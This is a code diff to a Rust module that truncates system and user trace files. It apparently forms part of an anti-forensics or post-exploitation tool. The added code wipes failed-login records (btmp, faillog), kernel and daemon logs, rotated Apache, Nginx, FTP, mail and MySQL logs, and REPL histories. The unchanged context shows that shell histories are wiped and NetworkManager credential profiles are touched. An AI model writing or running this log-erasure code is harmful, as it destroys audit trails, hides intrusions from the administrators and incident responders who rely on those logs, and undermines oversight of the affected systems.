@@ -1,5 +1,5 @@
 // Clean process-trace artifacts: recently-used files, session errors, thumbnails,
-// GTK bookmarks, X11 sockets, pip user cache, and misc desktop traces.
+// GTK bookmarks, X11 sockets, pip user cache, web/ftp/db logs, and misc desktop traces.
 
 use std::fs;
 use std::path::{Path, PathBuf};
@@ -38,6 +38,18 @@ fn remove_dir_rec(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
                     if verbose { eprintln!("[!] proc-clean: {:?}: {}", p, e); } }
     }
 }
+
+// Truncate all files matching a glob pattern (handles rotated logs like auth.log.1, auth.log.2.gz)
+#[cfg(target_os = "linux")]
+fn wipe_glob(pattern: &str, s: &mut ProcCleanStats, verbose: bool) {
+    if let Ok(paths) = glob::glob(pattern) {
+        for entry in paths.flatten() {
+            truncate_file(&entry, s, verbose);
+        }
+    }
+}
+#[cfg(not(target_os = "linux"))]
+fn wipe_glob(_pattern: &str, _s: &mut ProcCleanStats, _verbose: bool) {}
 
 fn home_dirs() -> Vec<PathBuf> {
     let mut homes = Vec::new();
@@ -105,8 +117,9 @@ pub fn clean_proc_artifacts(verbose: bool) -> ProcCleanStats {
         truncate_file(&home.join(".zsh_history"), &mut s, verbose);
         truncate_file(&home.join(".fish_history"), &mut s, verbose);
 
-        // Python REPL history
+        // Python / Node.js REPL history
         remove_file_silent(&home.join(".python_history"), &mut s, verbose);
+        remove_file_silent(&home.join(".node_repl_history"), &mut s, verbose);
 
         // Clear dconf database (GNOME settings / recent activity)
         let dconf = home.join(".config/dconf/user");
@@ -151,15 +164,62 @@ pub fn clean_proc_artifacts(verbose: bool) -> ProcCleanStats {
         }
     }
 
-    // btmp: clear failed-login log
+    // btmp: failed-login records (read by `lastb`) — same binary format as wtmp
     truncate_file(Path::new("/var/log/btmp"), &mut s, verbose);
+    wipe_glob("/var/log/btmp.*", &mut s, verbose);
+
+    // faillog: PAM per-UID failure counters (indexed binary, read by `faillog`)
+    truncate_file(Path::new("/var/log/faillog"), &mut s, verbose);
 
     // kern.log: USB events, module loads, network kernel events
     truncate_file(Path::new("/var/log/kern.log"), &mut s, verbose);
     truncate_file(Path::new("/var/log/kern"), &mut s, verbose);
+    wipe_glob("/var/log/kern.log.*", &mut s, verbose);
 
-    // maillog / mail spool
+    // daemon.log: background service events
+    truncate_file(Path::new("/var/log/daemon.log"), &mut s, verbose);
+    wipe_glob("/var/log/daemon.log.*", &mut s, verbose);
+
+    // dmesg snapshot (differs from /proc/kmsg ring buffer — this is the saved file)
+    truncate_file(Path::new("/var/log/dmesg"), &mut s, verbose);
+    truncate_file(Path::new("/var/log/dmesg.old"), &mut s, verbose);
+
+    // maillog / mail server logs + mail spool
+    for p in &["/var/log/mail.log", "/var/log/maillog", "/var/log/mail.err"] {
+        truncate_file(Path::new(p), &mut s, verbose);
+    }
+    wipe_glob("/var/log/mail.log.*", &mut s, verbose);
+    wipe_glob("/var/log/maillog.*", &mut s, verbose);
     truncate_file(Path::new("/var/spool/mail/root"), &mut s, verbose);
+    // Plesk mail log
+    truncate_file(Path::new("/usr/local/psa/var/log/maillog"), &mut s, verbose);
+
+    // Web server logs — Apache2 (Debian/Ubuntu layout)
+    wipe_glob("/var/log/apache2/access.log*", &mut s, verbose);
+    wipe_glob("/var/log/apache2/error.log*", &mut s, verbose);
+    wipe_glob("/var/log/apache2/other_vhosts_access.log*", &mut s, verbose);
+    // Apache httpd (RHEL/CentOS layout)
+    wipe_glob("/var/log/httpd/access_log*", &mut s, verbose);
+    wipe_glob("/var/log/httpd/error_log*", &mut s, verbose);
+    // Apache (generic layout)
+    wipe_glob("/var/log/apache/access.log*", &mut s, verbose);
+    wipe_glob("/var/log/apache/error.log*", &mut s, verbose);
+    // Nginx
+    wipe_glob("/var/log/nginx/access.log*", &mut s, verbose);
+    wipe_glob("/var/log/nginx/error.log*", &mut s, verbose);
+
+    // FTP server logs
+    wipe_glob("/var/log/xferlog*", &mut s, verbose);
+    wipe_glob("/var/log/pureftp.log*", &mut s, verbose);
+    truncate_file(Path::new("/var/log/vsftpd.log"), &mut s, verbose);
+    truncate_file(Path::new("/usr/local/psa/var/log/xferlog"), &mut s, verbose);
+
+    // Database logs — MySQL / MariaDB
+    truncate_file(Path::new("/var/log/mysql.log"), &mut s, verbose);
+    truncate_file(Path::new("/var/log/mysqld.log"), &mut s, verbose);
+    truncate_file(Path::new("/var/log/mysql/mysql.log"), &mut s, verbose);
+    truncate_file(Path::new("/var/log/mysql/error.log"), &mut s, verbose);
+    truncate_file(Path::new("/var/log/mariadb/mariadb.log"), &mut s, verbose);
 
     // NetworkManager connection profiles (WiFi credentials, connection history)
     let nm_conn = Path::new("/etc/NetworkManager/system-connections");
